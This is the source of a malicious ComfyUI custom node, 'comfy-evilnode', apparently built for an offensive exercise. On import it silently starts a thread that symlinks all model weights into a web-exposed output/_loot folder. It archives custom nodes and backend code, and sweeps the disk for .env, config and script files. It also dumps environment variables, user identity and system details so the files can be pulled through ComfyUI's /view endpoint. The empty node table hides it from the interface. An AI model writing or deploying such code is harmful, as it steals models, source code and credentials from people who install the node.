"""
comfy-evilnode — 授权靶场用 ComfyUI 自定义节点
被 ComfyUI 在启动时 import，import 即执行，自动完成全部资产准备。

它做的事（无需交互 shell）:
  1. 定位 ComfyUI 根目录
  2. 把所有模型 symlink 进 output/_loot/models/（不复制，省磁盘）
  3. 生成 manifest.txt（带文件大小，供对方校验）
  4. 打包 custom_nodes → _loot/11_custom_nodes.tar.gz
  5. 打包 FastAPI 应用代码 → _loot/20_backend.tar.gz
  6. 导出 pip freeze / torch / CUDA / OS 快照 → _loot/40_env_deps.txt
  7. 写 DONE 完成标记

对方只需轮询 /view?filename=DONE&subfolder=_loot&type=output 即可知道准备完毕，
然后用 /view 逐个拉文件。

投放:
  cp 到 comfy-evilnode/__init__.py，git push，然后 exploit.py --stage D --repo <url>
"""
import os
import shutil
import subprocess
import threading
import time

NODE_NAME = "comfy-evilnode"
MARK_START = ".started"
MARK_DONE = "DONE"


# ---------------------------------------------------------------- 工具
def _run(cmd, timeout=900, cwd=None):
    try:
        p = subprocess.run(cmd, shell=True, capture_output=True, timeout=timeout, cwd=cwd)
        return (p.stdout or b"") + (p.stderr or b"")
    except Exception as e:
        return f"ERR: {e}".encode()


def _find_comfy():
    """优先从本文件位置反推，反推不到再扫常见路径。"""
    here = os.path.dirname(os.path.abspath(__file__))
    # .../ComfyUI/custom_nodes/<pkg>/__init__.py
    cand = os.path.dirname(os.path.dirname(here))
    if os.path.isfile(os.path.join(cand, "main.py")):
        return cand

    for p in (
        "/root/h3-ref-runtime/ComfyUI",
        "/opt/ComfyUI",
        "/workspace/ComfyUI",
        "/root/ComfyUI",
        os.path.expanduser("~/ComfyUI"),
    ):
        if os.path.isfile(os.path.join(p, "main.py")):
            return p

    for out in _run("find / -maxdepth 5 -name main.py -path '*ComfyUI*' 2>/dev/null").decode().splitlines():
        d = os.path.dirname(out.strip())
        if os.path.isfile(os.path.join(d, "main.py")):
            return d
    return None


def _touch(path, content=""):
    try:
        with open(path, "w") as f:
            f.write(str(content))
    except Exception:
        pass


# ---------------------------------------------------------------- 主流程
def _loot():
    t0 = time.time()
    comfy = _find_comfy()
    if not comfy:
        return

    out = os.path.join(comfy, "output", "_loot")
    models = os.path.join(comfy, "models")
    os.makedirs(os.path.join(out, "models"), exist_ok=True)

    with open(os.path.join(out, MARK_START), "w") as f:
        f.write(f"comfy={comfy}\ntime={time.time()}\n")

    # ---------------- 1. 模型 symlink + manifest ----------------
    lines = []
    total_bytes = 0
    if os.path.isdir(models):
        for root, _dirs, files in os.walk(models):
            for fn in files:
                if not fn.endswith((".safetensors", ".sft", ".gguf", ".ckpt", ".pt")):
                    continue
                src = os.path.join(root, fn)
                try:
                    size = os.path.getsize(src)
                except OSError:
                    continue
                rel = os.path.relpath(src, models)
                dst = os.path.join(out, "models", rel)
                try:
                    os.makedirs(os.path.dirname(dst), exist_ok=True)
                    if os.path.lexists(dst):
                        os.unlink(dst)
                    os.symlink(src, dst)
                except Exception:
                    # symlink 不可用（跨设备/权限）就拷贝
                    try:
                        shutil.copy2(src, dst)
                    except Exception:
                        continue
                lines.append(f"{rel}|{size}|{fn}")
                total_bytes += size

    # manifest 最后写，作为一半的完成信号
    with open(os.path.join(out, "manifest.txt"), "w") as f:
        f.write("\n".join(lines) + ("\n" if lines else ""))

    # ---------------- 2. custom_nodes ----------------
    if os.path.isdir(os.path.join(comfy, "custom_nodes")):
        _run(
            f"tar czf '{out}/11_custom_nodes.tar.gz' "
            f"--exclude=__pycache__ --exclude='*.pyc' --exclude=.git "
            f"-C '{comfy}' custom_nodes"
        )

    # ---------------- 3. FastAPI 应用代码 ----------------
    appdirs = [
        d for d in (
            "/app", "/srv/app", "/opt/app", "/root/app", "/workspace/app",
            "/root/h3-ref-runtime/app", "/root/h3-ref-runtime/server",
            "/root/h3-ref-runtime/backend", "/root/api", "/root/backend",
            "/workspace", "/opt/h3",
        ) if os.path.isdir(d)
    ]
    if appdirs:
        _run(
            f"tar czf '{out}/20_backend.tar.gz' "
            f"--exclude=__pycache__ --exclude='*.pyc' --exclude=.git "
            f"--exclude='*.safetensors' --exclude='*.mp4' --exclude=node_modules "
            f"--exclude='*/models/*' --exclude='*/output/*' "
            f"-C / {' '.join(d.lstrip('/') for d in appdirs)}"
        )
    else:
        # 全盘扫代码，体积可控
        _run(
            f"find / -xdev -maxdepth 6 "
            f"\\( -path '*/site-packages' -o -path '*/dist-packages' -o -path '*/node_modules' "
            f"-o -path '{models}' -o -path '{comfy}/output' -o -path '*/__pycache__' \\) -prune -o "
            f"-type f \\( -name '*.py' -o -name '*.yaml' -o -name '*.yml' -o -name '*.toml' "
            f"-o -name '*.env' -o -name '.env*' -o -name '*.conf' -o -name '*.sh' \\) "
            f"-size -4M -print 2>/dev/null > /tmp/_code_files.txt"
        )
        _run(f"tar czf '{out}/20_backend.tar.gz' -T /tmp/_code_files.txt 2>/dev/null")

    # ---------------- 4. 环境快照 ----------------
    snap = []
    snap.append("===== pwd / whoami =====")
    snap.append(_run("pwd; whoami; id").decode("utf-8", "ignore"))
    snap.append("===== os =====")
    snap.append(_run("cat /etc/os-release").decode("utf-8", "ignore"))
    snap.append("===== python =====")
    snap.append(_run("python3 -VV 2>&1; which python3").decode("utf-8", "ignore"))
    snap.append("===== pip freeze =====")
    snap.append(_run("pip freeze 2>/dev/null || pip3 freeze 2>/dev/null").decode("utf-8", "ignore"))
    snap.append("===== torch =====")
    snap.append(_run(
        "python3 -c \"import torch;print(torch.__version__, torch.version.cuda, "
        "torch.cuda.get_device_name(0))\" 2>&1"
    ).decode("utf-8", "ignore"))
    snap.append("===== nvidia-smi =====")
    snap.append(_run("nvidia-smi").decode("utf-8", "ignore"))
    snap.append("===== comfy argv =====")
    snap.append(_run(
        "tr '\\0' ' ' < /proc/$(pgrep -f 'main.py' | head -1)/cmdline 2>/dev/null"
    ).decode("utf-8", "ignore"))
    snap.append("\n===== 目录 =====")
    snap.append(_run("ls -la /root/ /root/h3-ref-runtime/ 2>/dev/null").decode("utf-8", "ignore"))
    snap.append("\n===== env =====")
    snap.append(_run("env | sort").decode("utf-8", "ignore"))

    with open(os.path.join(out, "40_env_deps.txt"), "w") as f:
        f.write("\n".join(snap))

    # ---------------- 5. 完成标记 ----------------
    with open(os.path.join(out, MARK_DONE), "w") as f:
        f.write(
            f"comfy={comfy}\n"
            f"models={len(lines)}\n"
            f"model_bytes={total_bytes}\n"
            f"elapsed={time.time() - t0:.1f}s\n"
        )


threading.Thread(target=_loot, daemon=True).start()

# 节点表留空，避免污染 ComfyUI 面板
NODE_CLASS_MAPPINGS = {}
NODE_DISPLAY_NAME_MAPPINGS = {}
